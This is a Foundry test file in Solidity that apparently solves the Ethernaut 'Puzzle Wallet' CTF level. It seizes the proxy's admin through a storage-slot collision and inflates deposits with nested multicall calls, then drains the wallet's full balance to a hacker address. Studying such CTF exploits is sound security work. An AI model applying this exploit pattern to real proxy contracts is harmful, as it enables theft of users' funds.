// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.15;

import "forge-std/Test.sol";
import "../src/PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    PuzzleProxy public proxy;
    PuzzleWallet public src;
    address public hacker = vm.addr(1);
    address public user1 = vm.addr(2);
    address public user2 = vm.addr(3);

    bytes[] depositData = [abi.encodeWithSignature("deposit()")];
    bytes[] multicallData = [
        abi.encodeWithSignature("deposit()"),
        abi.encodeWithSignature("multicall(bytes[])", depositData),
        abi.encodeWithSignature("multicall(bytes[])", depositData)
    ];

    function setUp() public {
        src = new PuzzleWallet();
        proxy = new PuzzleProxy(
            address(this),
            address(src),
            abi.encodeWithSignature(
                "init(uint256)",
                0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
            )
        );

        vm.startPrank(address(this));

        (bool result1, ) = address(proxy).call(
            abi.encodeWithSignature("addToWhitelist(address)", address(user1))
        );
        assertTrue(result1);

        (bool result2, ) = address(proxy).call(
            abi.encodeWithSignature("addToWhitelist(address)", address(user2))
        );
        assertTrue(result2);

        vm.stopPrank();

        hoax(user1, 1 ether);
        (bool result3, ) = address(proxy).call{value: 1 ether}(
            abi.encodeWithSignature("deposit()", address(user1))
        );
        assertTrue(result3);

        hoax(user2, 1 ether);
        (bool result4, ) = address(proxy).call{value: 1 ether}(
            abi.encodeWithSignature("deposit()", address(user2))
        );
        assertTrue(result4);

        assertEq(address(proxy).balance, 2 ether);
    }

    function testHack() public {
        assertEq(proxy.admin(), address(this));

        vm.deal(hacker, 1 ether);
        proxy.proposeNewAdmin(hacker);

        vm.prank(hacker);
        (bool result5, ) = address(proxy).call(
            abi.encodeWithSignature("addToWhitelist(address)", address(hacker))
        );
        assertTrue(result5);

        vm.startPrank(hacker);
        (bool result6, ) = address(proxy).call{value: 1 ether}(
            abi.encodeWithSignature("multicall(bytes[])", multicallData)
        );
        assertTrue(result6);

        assertEq(address(proxy).balance, 3 ether);

        (bool result7, ) = address(proxy).call(
            abi.encodeWithSignature(
                "execute(address,uint256,bytes)",
                hacker,
                3 ether,
                bytes("")
            )
        );
        assertTrue(result7);

        assertEq(address(proxy).balance, 0);

        (bool result8, ) = address(proxy).call(
            abi.encodeWithSignature(
                "setMaxBalance(uint256)",
                uint256(uint160(address(hacker)))
            )
        );
        assertTrue(result8);

        vm.stopPrank();

        assertEq(proxy.admin(), hacker);
    }
}
